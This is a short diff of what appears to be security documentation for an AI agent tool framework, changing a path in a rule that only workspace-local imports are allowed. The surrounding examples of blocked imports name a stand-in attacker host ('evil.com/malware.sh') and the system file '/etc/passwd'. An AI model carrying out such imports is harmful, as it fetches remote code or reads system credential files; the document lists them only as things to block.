@@ -299,7 +299,7 @@ import { malicious } from "https://evil.com/malware.sh";
 3. **Local Imports Only**: Only import from workspace
 ```bash
 // Allowed
-# Call tools from agent/tools/anvilmcp/read_inbox.sh";
+# Call tools from anvillm/tools/anvilmcp/read_inbox.sh";
 
 // Blocked (outside workspace)
 import { evil } from "/etc/passwd";
